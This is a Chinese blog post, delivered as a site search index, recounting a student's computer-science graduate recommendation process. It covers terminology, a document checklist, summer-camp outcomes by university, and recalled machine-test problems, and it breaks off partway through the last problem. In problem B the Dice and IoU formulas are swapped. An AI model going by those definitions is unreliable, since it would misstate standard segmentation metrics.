<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>25届计算机保研经历记录</title>
    <link href="/2024/10/21/25%E5%B1%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BF%9D%E7%A0%94%E7%BB%8F%E5%8E%86%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/10/21/25%E5%B1%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BF%9D%E7%A0%94%E7%BB%8F%E5%8E%86%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="写在前面">1. 写在前面</h1><h2 id="个人感想">1.1 个人感想</h2><p>今年的夏令营和预推免形式很混乱，如果直接套用往年学长学姐的入营形式，会寄的很惨!除非是保研大佬，其实不确定因素都挺大的。每个院校有强弱com之分，老师和实验室面试也有自己的偏好，还有各种替补捡漏，填报项目的博弈等等。只要你决定保研，别管自己配不配，只管去尝试就好了，相信命运的安排。</p><p>夏令营的时候其实形式还是挺不错的，虽然说越来越多学校倾向于不发offer且大海营，但基本上高rank或者科研大佬强com的中下九学校都会给机会。但是对于一些上九或者华五其实难度是增加了，基本上小专业没一点机会，直接死卡百分比和学科评估（一流本科专业）。</p><p>到了预推免的时候情况直转极下（和去年形成鲜明对比），夏令营能入的营没一个进得去。本校一大堆预推免报了二三十个学校院系，最后只入了一两个（本人也是<spanclass="github-emoji" data-alias="fearful" style=""data-fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f628.png?v8">😨</span>），而且不管你是大专业rank1还是小专业科研大佬都这样，可能这就是末2的命。同时还有很多学校特傻逼，928填系统当天面试，让一大堆大佬不敢释放手中offer，但这样也导致有很多人捡漏上岸顶级offer。</p><p>最后结果就是929当天中九以上学校没一个不被鸽穿的<spanclass="github-emoji" data-alias="sweat" style=""data-fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8">😓</span>，只要你敢等就能上岸中九甚至航开济。总结来看反正只要你能入营同时拿到wl，想去这个学校最后都能去到。搞不懂那些被鸽穿的学校的行政老师心里是怎么想的，天天excel筛进来不可能会来的学生，把真心想去的学生全部拒之门外，活该被鸽穿。</p><h2 id="个人背景">1.2 个人背景</h2><ul><li>院校：东北某末流211</li><li>专业：人工智能</li><li>成绩：夏令营（1/39）预推免（1/39）</li><li>英语：515（CET-6）498（CET-4）</li><li>科研：一个水水的国家级大创（无产出）</li><li>竞赛：两个水奖国二，三个水奖国三，外加水水的数学建模比赛</li><li>去向：华中科技大学计算机学院计算机专硕</li></ul><h2 id="保研需要知道的一些知识">1.3 保研需要知道的一些知识</h2><p><strong>流程</strong>：基本可以按照这个来</p><figure><img src="https://s2.loli.net/2024/10/21/Ot1maKdb2pBczJy.jpg"alt="流程时间" /><figcaption aria-hidden="true">流程时间</figcaption></figure><p><strong>夏令营</strong>：在6~8月由各个学校举办的选拔性活动，是获得offer的途径之一。顺利进入夏令营被称作“<strong>入营</strong>”。会选拔出优秀营员，简称“<strong>优营</strong>”。优营会在后续的考核或最后的录取中具有一定的优势，不同学校优势不同，有些是预推免直通器比如<strong>浙软、同济软</strong>等，有些是铁offer比如<strong>同济计算机、厦大全部院系</strong>等，有些就一点用没有比如<strong>北航计算机所有院系</strong>。</p><p><strong>预推免</strong>：在9月由各个学校举办的选拔性活动，是获得offer的途径之一，可以理解为第二轮夏令营，大部分学校会在9月中下旬，有些学校则会在928当天比如<strong>北航、北理、西工大等</strong>。</p><p><strong>928/929</strong>：保研人在阳历9月28日9点开始填系统、阳历9月29日9点开始录取，为保研画上句号，是保研选手上岸的日子。填上一个学校后48小时内不能更改该学校，同时学校那边是能看得到你填了啥的，今年开始很多学校会要求28日早上12点前填写完毕，否则放弃该学校资格，所以谨慎填写。</p><p><strong>绿裙</strong>:计算机保研绿色交流群，每个计算机保研人必加的群好吧，在绿裙的半年直接开阔了眼界，人手一个中九顶刊✌，直接跪了。<strong><ahref="https://github.com/CS-BAOYAN">认准正宗绿裙地址</a></strong></p><p><strong>rk</strong>：成绩排名的简写</p><p><strong>oq</strong>： overqualified的简称。你的简历或者背景太好了，学校认为你不会来他们学校，就不会让你入营，简称你oq啦。</p><p><strong>bg</strong>： background的简称。</p><p><strong>bar</strong>：学校会从报名夏令营和预推免的人中，根据你本科院校和学科排名，筛选出报名人中的优秀选手入营，而学校所选取的院校与排名的标准，称为bar。</p><p><strong>title</strong>：指学校的名声响不响，实力强不强。说一个学校title好，是指这个学校水平比较高，出来的学生的水平比较受业界认可。</p><p><strong>套磁</strong>：来源于touch，指学生和老师联系。他提前套了这个老师，意思就是提前联系了这个老师。还有一种套磁是<strong>反向套磁</strong>，指老师反向联系学生。</p><p><strong>强com/弱com</strong>：学校招生办的话语权大/导师话语权小，则称这个学校为强com；反之为弱com。强com套磁用处不大，由学校教务通过excel等方式筛选，导师难以改变结果，；弱com陶瓷更有用，导师可以直接把你捞上去。</p><p><strong>鸽子</strong>：指拿了offer但最后不去的选手。<strong>鸽</strong>指把学校的offer或老师的offer拒绝掉。推荐大家早点鸽，学术圈子还是很小的，基本上早点鸽老师一般不会记仇的，929鸽那就寄寄了。</p><p><strong>wl</strong>：waitinglist，候补队列。学校为了防止夏令营/预推免选出的优秀选手把自己鸽了，会选出一些后备选手，前面鸽一个，就从这个队列里拽一个上来发offer。</p><h2 id="考察方式">1.4 考察方式</h2><p><strong>408</strong>：很多学校会考察专业课的内容，包含数据结构、计算机组成原理、计算机网络、操作系统。大部分学校以408为主，有些学校也会考察数据库、编译原理等其他学科。有的学校是笔试考核，有的学校是面试期间提问。<strong>基本上有项目就不会被问</strong>。</p><p><strong>自我介绍</strong>：很多学校在面试时都会让做自我介绍，中英文都要准备，最好准备一份一分钟的，一份三分钟的。</p><p><strong>项目</strong>：因为导师喜欢有过项目经验、具有自己需要的专业领域知识的同学，这些同学对于导师而言，非常可贵，因为培养成本很小。项目通常在面试中会被提问，有些学校的老师会问得非常细致。<strong>为了让面试老师知道你的项目，最好把项目写在简历当中！</strong>当然，如果没有项目，可以稍微自己包装一下，但是并不提倡，因为自己编的项目，很容易被一些问的很细的老师发现其中的端倪（被问到自己不会的内容从而被发现项目的真实性，我们通常称之为<strong>被问穿</strong>）。</p><p><strong>英语</strong>：英语是一定会被问的，有些学校是让你自我介绍，有些学校是抽翻译，有些学校是英文问答。</p><p><strong>获奖情况</strong>：老师们基本只关注国家级的奖项，并且面试老师不认识的比赛基本他都会认为没啥含金量。我在面试的时候没被问过比赛内容，除了数学建模。</p><p><strong>机试</strong>：有机试的学校通常机试非常重要，现在学校基本都有机试，一定要好好准备。</p><h1 id="前期准备">2. 前期准备</h1><h2 id="材料准备">2.1 材料准备</h2><table><thead><tr><th>材料</th><th>优先级</th><th>获取方式</th><th>备注</th></tr></thead><tbody><tr><td>身份证扫描件</td><td>高</td><td>打印店扫描或拍照扫描</td><td>正反面同页</td></tr><tr><td>学生证扫描件</td><td>高</td><td>打印店扫描或拍照扫描</td><td>封面与个人信息同页</td></tr><tr><td>本科成绩单</td><td>高</td><td>教务处</td><td>准备好中英文的，原件还有复印件</td></tr><tr><td>排名证明</td><td>高</td><td>教务处</td><td>证明一定得带有教务处or学院的公章</td></tr><tr><td>四六级证书</td><td>高</td><td>教务处or拍照扫描</td><td>若丢失需及时补办</td></tr><tr><td>在读证明</td><td>高</td><td>教务处</td><td>无</td></tr><tr><td>证件照</td><td>高</td><td>照相馆</td><td>电子版，底色一般不做要求，准备好蓝底和白底</td></tr><tr><td>学籍在线检测报告</td><td>高</td><td>学信网</td><td>无</td></tr><tr><td>其他语言证书（如有）</td><td>高</td><td>根据具体语言</td><td>英语的像托福、雅思在部分学校可换算六级成绩</td></tr><tr><td>导师推荐信两封</td><td>高</td><td>自己拟写好后给老师签名</td><td>最好都找正教授，有的学校要求2封正教授的推荐信（ict等）</td></tr><tr><td>个人简历</td><td>高</td><td>推荐绿裙的Overleaf简历模板</td><td>最好一页，简洁大方</td></tr><tr><td>个人陈述</td><td>高</td><td>参考网上模板</td><td>约等于简历的详细描述版</td></tr><tr><td>竞赛证书</td><td>高</td><td>拍照扫描or官网下载</td><td>每个竞赛分文件夹存放</td></tr><tr><td>科研证明</td><td>高</td><td>根据具体项目</td><td>论文、软著、大创等</td></tr><tr><td>学校进度表</td><td>高</td><td>Excel或者Notion等</td><td>夏令营和预推免各开一个，包含学校、学院、报名通知网站、报名系统网站、截止报名时间、是否需要寄材料、是否入营等</td></tr><tr><td>套磁信</td><td>中</td><td>删减个人陈述</td><td>记得加些针对该导师研究方向的个人介绍</td></tr><tr><td>中文自我介绍</td><td>中</td><td>删减个人陈述</td><td>一般要配 PPT，3-5分钟</td></tr><tr><td>英文自我介绍</td><td>中</td><td>删减个人陈述</td><td>一般是 1-2 分钟，也可加在中文介绍的开头</td></tr><tr><td>实习证明</td><td>中</td><td>实习公司</td><td>无</td></tr><tr><td>志愿证明</td><td>中</td><td>志愿平台官网或志愿部门</td><td>志愿服务对保研的作用应该是聊胜于无</td></tr></tbody></table><p>对于以上的材料，请准备好<strong>PDF版本和图片版，推荐信最好存放着word版</strong>，不同学校的推荐信<strong>只需改个学校名且将老师的电子签名放入其中然后转PDF</strong>即可，<strong>报名时需要频繁地合并PDF</strong>。同时建议早点在4-5月份就准备各类的材料，这样的话在夏令营高峰期就可以专心的联系老师和复习。这里推荐1个压缩PDF的网站<strong><ahref="https://link.zhihu.com/?target=https%3A//www.ilovepdf.com/zh-cn">ilovepdf</a></strong>。</p><p>同时报名完一个学校建议对这个学校所需要的材料创建一个文件夹，方便后续寻找所需材料。</p><h2 id="复习建议">2.2 复习建议</h2><ul><li><strong>机试</strong>：个人推荐越早复习机试越好，只要有机试的学校，基本机试成绩占比都不低，有的学校的老师甚至会喜欢机试成绩好的。如果你是打ACM的，那么就不用太复习机试。机试网站的话推荐学习时用<strong><ahref="https://www.acwing.com/">acwing的算法基础课</a></strong>，学完对应知识后去刷<strong><ahref="https://www.luogu.com.cn/training/list">洛谷的对应官方题单</a></strong>，后期可以每天刷几道leetcode题和对应学校的机试题，基本上这样做就够应付机试了。PS：实际上大部分人的机试水平都一般，只要你认真准备基本上就不会因为机试被卡</li><li>英语：英语的话推荐先认真写好并熟练背诵出自己的英文介绍，2分钟和5分钟版的都要准备，因为英文自我介绍考核的形式是最多的。其次的话可以去咸鱼或者小红书找一找那种英语问答的复习本，然后把对应的问题修改成自己的版本，熟练背诵即可。剩下的英文问题基本不用复习了，翻译啥的只能听天由命。</li><li><strong>项目&amp;科研</strong>：项目是最重要的，一定要把项目的每个部分都掌握清楚，比如项目的来源，项目的motivation、项目的分工以及项目的内容等等。<strong>不熟悉或者水的项目尽量就不要水进简历里面了，要是被问穿会给老师非常不好的印象</strong>。同时推荐大家在面试完后把老师问项目的题目以及你回答的内容定时的整理起来，这样你在后续准备的时候就有时间对这类问题进行归纳分析。</li><li>专业课：基本上你有项目或者科研老师就不会问题专业课，除非是学校面试环节要求必须有专业课的部分，个人推荐复习顺序：<strong>操作系统= 数据结构 &gt; 计算机网络 = 线性代数 = 离散数学 &gt;计算机组成原理</strong></li></ul><h2 id="联系老师">2.3 联系老师</h2><p>联系导师很重要，如果还不清楚导师重要性的可以看看<ahref="https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/siYmpY_Q9fH8s0ntLIhZyw">东五往事</a>，主要讲的<strong>华科计院东五实验室</strong>，有位著名的chh老师就是属于东五实验室。</p><p>如果是<strong>就业向，尽可能找羊导，至少也要找能放实习的导</strong>。实习对于就业向至关重要；如果是<strong>学术向</strong>，尽可能找<strong>强导</strong>，找<strong>学术水平强、帽子多（院士、杰青、优青等等）、con强（院士/院士组/学术界/工业界等等）</strong>的导。</p><p>基本上联系导师都是通过邮件，网上都有套磁信模板，如果不是特别想去就可以直接套用套磁信模板，如果有特别想去的老师，推荐不要用套磁信模板，你可以先读他的文章，然后从他的文章方向入手去套他。同一时间尽量只联系一个学院的一个老师，如果老师两天内已读不回基本上就可以套下一个，预推免的时候时间可以短点，基本上一天已读不会就可以下一个。</p><p>一般老师都会给你画大饼，但实际上有些情况你只能通过直系学长才能了解到，推荐大家在确定去老师前先打听好这个老师的一些情况，推荐可以去<strong>小红书、知乎或者通过论文里的邮箱给学长学姐发邮件来进行联系</strong>（只能说这么多<spanclass="github-emoji" data-alias="laughing" style=""data-fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8">😆</span></p><h1 id="夏令营">3. 夏令营</h1><h2 id="个人感受">3.1 个人感受</h2><p>对于我们学校来说，很多强com的学校的夏令营，bar基本都卡rk1~2（小专业），或者只选取同一个学校报名中人数最多的专业中的rank1-3（我被计科卡麻了，只要计科rk1和rk2报就没我的机会）。在夏令营基本结束的时候，我学校大部分人强com的学校基本上都是rk1到rk3有offer，其他基本上没怎么听说有的，弱com的学校就看个人能力了，跟学校无关。</p><h2 id="入营情况">3.2 入营情况</h2><table><thead><tr><th style="text-align: left;">学校学院</th><th>入营</th><th>结果</th><th>备注</th></tr></thead><tbody><tr><td style="text-align: left;">吉林大学计算机学院学硕</td><td>✔</td><td>放弃参加</td><td>和厦大撞了</td></tr><tr><td style="text-align: left;">天津大学智算学部专硕</td><td>✔</td><td>✔</td><td>海不拉几的学校，7月16号说给offer，9月10号才出夏令营结果（预推免第一批都开了），傻逼教务</td></tr><tr><td style="text-align: left;">厦门大学AI学院专硕</td><td>✔</td><td>✔</td><td>人文体验最好的夏令营yyds</td></tr><tr><td style="text-align: left;">湖南大学信息学院学硕</td><td>✔</td><td>✔</td><td>保底用的</td></tr><tr><td style="text-align: left;">中山大学AI学院专硕</td><td>✔</td><td>候补第8</td><td>候补到了，中山AI专硕基本年年都要快穿</td></tr><tr><td style="text-align: left;">信工所专硕</td><td>✔</td><td>放弃参加</td><td>和厦大撞了</td></tr><tr><td style="text-align: left;">计算所智能算法实验室霸面</td><td>✔</td><td>放弃参加</td><td>竞争比太大，而且去北京花费太多</td></tr><tr><td style="text-align: left;">华中科技大学网络安全学院专硕</td><td>✔</td><td>放弃参加</td><td>和厦大撞了</td></tr><tr><td style="text-align: left;">国防科大计算机学院</td><td>✔</td><td>放弃参加</td><td>参加的第二批夏令营，不能先参加面试再体检（一千块大洋），遂放弃</td></tr><tr><td style="text-align: left;">北航软件专硕</td><td>✔</td><td>放弃参加</td><td>和天大撞了，同时不发offer</td></tr><tr><td style="text-align: left;">浙软专硕</td><td>✔</td><td>放弃参加</td><td>需要做一个月的项目，跟夏令营撞了就放弃，以为能像去年一样靠rk1进预推免，结果进不了了今年，一生的遗憾</td></tr><tr><td style="text-align: left;">南大软院专硕</td><td>❌</td><td></td><td>南大一杀</td></tr><tr><td style="text-align: left;">南京大学计算机学院专硕</td><td>❌</td><td></td><td>南大二杀</td></tr><tr><td style="text-align: left;">南大智能软件专硕</td><td>❌</td><td></td><td>南大三杀</td></tr><tr><td style="text-align: left;">同济大学电院计算机专硕</td><td>❌</td><td></td><td>卡小专业，计科rk1候补进了</td></tr><tr><td style="text-align: left;">华师软院专硕</td><td>❌</td><td></td><td>计科rk2进了，但计科rk1没进，bar未知</td></tr><tr><td style="text-align: left;">人大信息学院专硕</td><td>❌</td><td></td><td>比较喜欢acm选手，人大只有夏令营，跟人大无缘了</td></tr><tr><td style="text-align: left;">东北大学计算机学院学硕</td><td>❌</td><td></td><td>计科rk9无6级无科研进了学硕，但我没进，神奇的bar</td></tr><tr><td style="text-align: left;">上交电院专硕</td><td>❌</td><td></td><td>上交小专业就别想了，是计科rk1的天下，全计类就计科rk1进了</td></tr><tr><td style="text-align: left;">中山计算机学院专硕</td><td>❌</td><td></td><td>末2学生比较喜欢有论文的，已知我校计科有论文的都进了</td></tr><tr><td style="text-align: left;">中山软件学院专硕</td><td>❌</td><td></td><td>中山二杀</td></tr><tr><td style="text-align: left;">武大网安学硕</td><td>❌</td><td></td><td>梦校，但卡计科专业和百分比</td></tr><tr><td style="text-align: left;">中科大科学岛</td><td>❌</td><td></td><td>计算机方向卡9，网安院计科rk1进了，先研所要套老师</td></tr><tr><td style="text-align: left;">重大计算机学院学硕</td><td>❌</td><td></td><td>夏令营bar特高，结果预推免被鸽穿了，我预推免都没报，结果通知我进了<spanclass="github-emoji" data-alias="sweat" style=""data-fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8">😓</span></td></tr><tr><td style="text-align: left;">北师大人工智能学院专硕</td><td>❌</td><td></td><td>卡计科，只有计科能进</td></tr><tr><td style="text-align: left;">南开人工智能专硕</td><td>❌</td><td></td><td>bar很高，反正我校没人进，去年有直系学长去了才报的，结果没进<spanclass="github-emoji" data-alias="sweat" style=""data-fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8">😓</span></td></tr><tr><td style="text-align: left;">北京理工大学珠海专硕</td><td>❌</td><td></td><td>第一年开，夏令营没进bar很高，结果被鸽穿了</td></tr><tr><td style="text-align: left;">西交计院和软院专硕</td><td>❌</td><td></td><td>下头学校，歧视211</td></tr><tr><td style="text-align: left;">哈工大威海专硕</td><td>❌</td><td></td><td>211一个没要！</td></tr><tr><td style="text-align: left;">哈工大苏州专硕</td><td>❌</td><td></td><td>211一个没要！！</td></tr><tr><td style="text-align: left;">哈工大计算学部专硕</td><td>❌</td><td></td><td>哈工大三杀，211一个没要！！！</td></tr><tr><td style="text-align: left;">人大苏州计算机专硕</td><td>❌</td><td></td><td>第一年开，但照样没进</td></tr><tr><td style="text-align: left;">深先院数字所专硕</td><td>❌</td><td></td><td>bar太高，好像中9本的bar</td></tr><tr><td style="text-align: left;">人大高瓴直博</td><td>❌</td><td></td><td>不知道当时怎么敢的，至少中9本的bar</td></tr></tbody></table><h2 id="吉林大学计算机学院">3.3 吉林大学计算机学院</h2><p>今年吉林大学报名时间特别早，去年因为自己教务作死被鸽穿了，最后招了一堆四非学校的学生，所以今年计算机学院和人工智能学院直接改为弱com制度。最开始的时候要求只能推荐老师一年招收学生数的同学入营，后面可能是被联系的太多了就改成随意推荐了。</p><p>吉大今年比较偏爱东北学校的学生，我陶瓷的老师里也不会因为你是不知名的211而歧视你，整体感觉还是挺不错的。我当时是在5月底联系了一个做nlp方向的老师，面试流程基本就是<strong>6分钟自我介绍+ 15分钟交流他给的论文（LLM SFT方向的论文） +15分钟自由交流环节</strong>，论文交流环节主要就是问<strong>LLMSFT的一些细节</strong>，比如LoRA为什么有效，Prefix Tuning和PromptTuning的区别在哪里等，自由交流环节基本就是<strong>问我确不确定来（至少问了5分钟，老师是不是被鸽怕了），如果给你厦大offer和吉大offer去哪个（当时信誓旦旦的说来吉大，但是最后还是去了厦大的夏令营），为什么会从华南地区来东北上学，研究生毕业想去体制内还是互联网啥的</strong>，整体比较轻松，最后也是拿到了学硕的推荐。</p><p>出入营名单的时候基本2/3都是东北学校的学生，但就这样其实也挡不住学生鸽，入了200多个，最后去的不到80个吧，反正去了就有offer。吉大软院更是双非乐园，同样也是去了就有offer。</p><p>我看群里的说法，吉大夏令营好像是<strong>笔试+机试+面试</strong>，活动有和导师交流，如果你要认真准备的话（bushi，其实压力挺大的。</p><h2 id="天津大学智算学部专硕">3.4 天津大学智算学部专硕</h2><p>天津大学今年照样延续了往年的下头操作，到处海学生，已知招收批次至少有:<strong>夏令营、导师团（985专属）、预推免第一批、预推免第二批、本校一批、本校二批</strong>，导致你也不知道他给你发offer是不是真的铁offer，外加以前鸽过我校rank1，后期我拿到天大的offer后纠结了好久好久要不要直接摆烂去天大了。</p><p>天大夏令营初筛不筛人，只要你报名了就有机会参加线上的机试初筛，我当时参加的时候天大创了5个500人的QQ群（太海了<spanclass="github-emoji" data-alias="sweat_smile" style=""data-fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f605.png?v8">😅</span>)，最后参加线上机试的有快1900人，根据机试成绩筛出了250人参加夏令营（我当时过了4个小样例），最终到线下160人左右。机试有5道题，采取类IOI机制，你只能看到通没通过小样例，实际上的样例并不知道有没有通过。</p><p>参加线下夏令营后会<strong>再来一次机试（5道题2小时）和面试（10分钟），通过后就可以联系各团队老师自行考核，最后老师会把通过的名单上报到学校</strong>，实际上这个机试只要不爆零就不会被卡。（PS：<strong>我当天线下机试的时候发现一大堆ACM佬，反正能进线下夏令营的基本上机试都不差</strong>）</p><p><strong>学校面试的内容</strong>：</p><ul><li>5分钟PPT自我介绍</li><li>问了我大创项目的细节</li><li>你参加的比赛那么多是如何平衡好时间的</li><li>为什么会想来天津上学</li><li>介绍下LLM中常见的SFT方式</li></ul><p>天大offer形式主要有两种，第一个是<strong>夏令营A+</strong>，这个基本是铁的，一般不怎么会被鸽，但<strong>在天大一切都有可能</strong>；第二种是夏令营A-以及预推免的A+，这种不算offer，可以算候补形式的，往年大批被鸽的基本都是这种。反正没拿到夏令营A+的，就不要把天大当作铁offer了，要不然被鸽了很难受。（天黑哥警告⚠）</p><h3 id="机试题目">3.4.1 机试题目</h3><h4 id="题目-a-整数化">题目 A: 整数化</h4><h5 id="题目描述">题目描述</h5><p>小Z在处理二维坐标点上的数据，受到性能限制，他希望把所有的点对应到距离它最近的整数点（横纵坐标均为整数）上，请你帮他完成这个程序。如果一个点有多个距离它最近的点，取横纵坐标更小的那个点。如将(1,1.5)对应到(1, 1)，将(−1, −1.5)对应到(−1, −2)。</p><h5 id="输入">输入</h5><p>多组样例输入，第一行输入一个整数表示样例数。对于每个样例，包含两个数表示需要整型化的点。</p><h5 id="输出">输出</h5><p>对于每组样例，输出一行包含两个整数的坐标，用空格分割。</p><h5 id="样例输入输出">样例输入输出</h5><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs subunit">样例输入<br>3<br>1 1.5<br>2 3.2<br><span class="hljs-string">-1</span> <span class="hljs-string">-2</span><br>样例输出<br>1 1<br>2 3<br><span class="hljs-string">-1</span> <span class="hljs-string">-2</span><br></code></pre></td></tr></table></figure><h4 id="题目-b-多项评价指标">题目 B: 多项评价指标</h4><h5 id="题目描述-1">题目描述</h5><p><span class="math inline">\(Dice\)</span>系数和<spanclass="math inline">\(IoU\)</span>均为衡量两个集合相似度的重要度量，是图像分割领域的最常用的评价指标，小Z希望写一个程序完成两个指标的转化。</p><p><span class="math inline">\(Dice\)</span>系数计算方式:</p><p><span class="math display">\[Dice = \frac{TP}{TP+FP+FN}\]</span></p><p><span class="math inline">\(IoU\)</span>计算方式:</p><p><span class="math display">\[IoU =\frac{TP+TP}{TP+TP+FN+FP}\]</span></p><p>二者转化公式为:</p><p><span class="math display">\[Dice = \frac{2\times IoU}{IoU +1}\]</span></p><h5 id="输入-1">输入</h5><p>多组样例输入，第一行输入一个整数表示样例数对于每个样例，输入一行，包括度量名称及度量值，中间用空格隔开，其中指标名称只能为"dice"或"iou"，例如"dice0.45", "iou 0.80"</p><h5 id="输出-1">输出</h5><p>对于每组样例，输出一个数字表示转化为另一种度量的结果，输出四舍五入，保留两位小数</p><h5 id="样例输入输出-1">样例输入输出</h5><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">样例输入<br><span class="hljs-number">3</span><br><span class="hljs-keyword">dice </span><span class="hljs-number">0</span>.<span class="hljs-number">4</span><br>iou <span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-keyword">dice </span><span class="hljs-number">0</span>.<span class="hljs-number">9</span><br>样例输出<br><span class="hljs-number">0</span>.<span class="hljs-number">25</span><br><span class="hljs-number">0</span>.<span class="hljs-number">89</span><br><span class="hljs-number">0</span>.<span class="hljs-number">82</span><br></code></pre></td></tr></table></figure><h5 id="提示">提示</h5><p>输入的IoU和Dice均在[0,1]范围内</p><h4 id="题目-c-跳着数数">题目 C: 跳着数数</h4><h5 id="题目描述-2">题目描述</h5><p>小Z不喜欢0-9中较大的数字，他想知道如果去掉所有包含大数字的数之后<spanclass="math inline">\([1,n]\)</span>区间内还剩多少个数。</p><p>例如，小Z不喜欢7,8,9三个数字，将所有任意位存在这三个数字的数去掉后，<spanclass="math inline">\([1, 12]\)</span>中只剩下了<spanclass="math inline">\([1, 2, 3, 4, 5, 6,10, 11,12]\)</span>这9个数。</p><p>注意，9, 19, 190都包含9数字9，在计数时都需要删去。</p><h5 id="输入-2">输入</h5><p>多组样例输入，第一行输入一个整数<spanclass="math inline">\(T\)</span>表示样例数对于每个样例，包含两个数字<span class="math inline">\(n,k\)</span>， 表示需要在<spanclass="math inline">\([1,n]\)</span>内进行统计，<spanclass="math inline">\(k\)</span>表示小Z不喜欢的数字为<spanclass="math inline">\([k,9]\)</span>。</p><h5 id="输出-2">输出</h5><p>对于每组样例，输出一个数字表示删除不喜欢的数后剩余数字的数量。</p><h5 id="样例输入输出-2">样例输入输出</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">样例输入<br>2<br>12 7<br>100 5<br>样例输出<br>9<br>25<br></code></pre></td></tr></table></figure><h4 id="题目-d-掩码匹配">题目 D: 掩码匹配</h4><h5 id="题目描述-3">题目描述</h5><p>数字在计算机中是以二进制存储的，小Z在监控程序运行状态。他想知道给定一个掩码，一段内存中有多少个数可以匹配该掩码。</p><p>匹配定义：待匹配数为a，掩码为b，若b的二进制表示中所有的1，在a的二进制表示的相对应位置也为1，则称a可以匹配掩码b。</p><p>例如，1为掩码，其二进制表示为"1"，则1(1)，3(11)，5(101)，7(111)，......均可匹配该掩码，括号内为该数字对应二进制表示。</p><p>又例如，13的二进制为"1101"，如果掩码为12，12的二进制为"1100",掩码12可以匹配数字13。同时该掩码也可以匹配数字15(1111)。</p><p>为了简化问题，小Z所有的掩码保证二进制下1的个数不超过2个。</p><h5 id="输入-3">输入</h5><p>第一行包含一个整数<span class="math inline">\(n\)</span>,表示观测的内存长度，编号从1到<spanclass="math inline">\(n\)</span>。</p><p>第二行包含<spanclass="math inline">\(n\)</span>个整数表示内存中存储的数。</p><p>第三行包含一个整数<spanclass="math inline">\(q\)</span>表示询问数量。</p><p>接下来<span class="math inline">\(q\)</span>行每行包含三个整数<spanclass="math inline">\(s,t,m\)</span>,表示从位置<spanclass="math inline">\(s\)</span>到位置<spanclass="math inline">\(t\)</span>，掩码为<spanclass="math inline">\(m\)</span>。</p><h5 id="输出-3">输出</h5><p>对于每次询问，输出一个整数表示从<spanclass="math inline">\(s\)</span>到<spanclass="math inline">\(t\)</span>（包含起点和终点），可有多少数字可以匹配掩码<spanclass="math inline">\(m\)</span>。</p><h5 id="样例输入输出-3">样例输入输出</h5><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">样例输入<br>8<br>1<span class="hljs-number"> 2 </span>3<span class="hljs-number"> 4 </span>5<span class="hljs-number"> 6 </span>7 8<br>3<br>1<span class="hljs-number"> 8 </span>3<br>1<span class="hljs-number"> 8 </span>1<br>3<span class="hljs-number"> 8 </span>6<br>样例输出<br>2<br>4<br>2<br></code></pre></td></tr></table></figure><h5 id="提示-1">提示</h5><p>对于询问1，区间<span class="math inline">\([1,8]\)</span>内3和7可以匹配掩码3。对</p><p>于询问2，区间<span class="math inline">\([1, 8]\)</span>内<spanclass="math inline">\([1, 3, 5, 7]\)</span>可以匹配掩码1。</p><p>对于询问3，区间<span class="math inline">\([3,8]\)</span>内6和7可以匹配掩码6。</p><p><span class="math inline">\(1 \leq n \leq 20000\)</span></p><p><span class="math inline">\(1 \leq q \leq 100000\)</span></p><p><span class="math inline">\(m \gt0\)</span>且保证二进制下至多两位为1</p><p>内存中储存的数字范围为<span class="math inline">\([1,108]\)</span></p><h4 id="题目-e-更短的最短路">题目 E: 更短的最短路</h4><h5 id="题目描述-4">题目描述</h5><p>小Z在处理一个特殊的最短路径问题，在无向图中有部分边在最初始时是上锁没法通过的，当他拿到位于节点的钥匙后，这些边就可以通过了。</p><p>通过一条边的花费为边权值，他想知道从节点1走到节点<spanclass="math inline">\(n\)</span>的最小花费是多少。</p><h5 id="输入-4">输入</h5><p>多组样例输入，第一行输入一个整数<spanclass="math inline">\(T\)</span>表示样例数</p><p>对于每个样例，第一行包含两个整数<spanclass="math inline">\(n,m,k\)</span>，图一共<spanclass="math inline">\(n\)</span>个节点<spanclass="math inline">\(m\)</span>条边，节点编号从<spanclass="math inline">\(1\)</span>到<spanclass="math inline">\(n\)</span>，钥匙在节点<spanclass="math inline">\(k\)</span> 。</p><p>接下来<span class="math inline">\(m\)</span>行每行包含四个整数，<spanclass="math inline">\(s,t,w,v\)</span>表示有一条从<spanclass="math inline">\(s\)</span>到<spanclass="math inline">\(t\)</span>的边，权重为<spanclass="math inline">\(w\)</span>，如果<spanclass="math inline">\(v\)</span>为0则表示不需要钥匙就可以通行，如果是<spanclass="math inline">\(1\)</span>则表示该边需要拿到钥匙后才能通行。</p><h5 id="输出-4">输出</h5><p>对于每组样例，输出一个整数表示从1到<spanclass="math inline">\(n\)</span>的最短路，如果不能到达，则输出-1。</p><h5 id="样例输入输出-4">样例输入输出</h5><figure 